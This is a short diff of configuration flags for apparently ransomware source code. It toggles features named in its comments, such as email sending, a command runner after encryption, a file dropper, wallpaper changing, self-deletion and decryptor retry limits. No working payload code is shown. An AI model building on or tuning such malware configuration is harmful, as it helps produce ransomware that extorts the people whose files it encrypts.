@@ -54,8 +54,8 @@
 #define DROP_CUSTOM_FILE	false	// enable or disable custom file dropper (custom file location at the beggining of main.cpp)
 #define CHANGE_WALLPAPER	false	// enable or disable changer of wallpaper
 #define SEND_EMAIL			true	// enable or disable email sender
-#define DEBUG_SEND_EMAIL	false	// enable or disable email sender in debug mode
-#define SEND_CUSTOM_COMMAND true	// enable or disable custom command runner after encrytpion
+#define DEBUG_SEND_EMAIL	true	// enable or disable email sender in debug mode
+#define SEND_CUSTOM_COMMAND false	// enable or disable custom command runner after encrytpion
 #define SELFKILL			false	// enable or disable self killer at the end of the program
 #define MAX_RETRIES			false	// enable or disable a maximum number of retries for decryptor
 #define SELFKILL_RETRIES	false	// enable or disable selfkill after maximum number of retries for decryptor
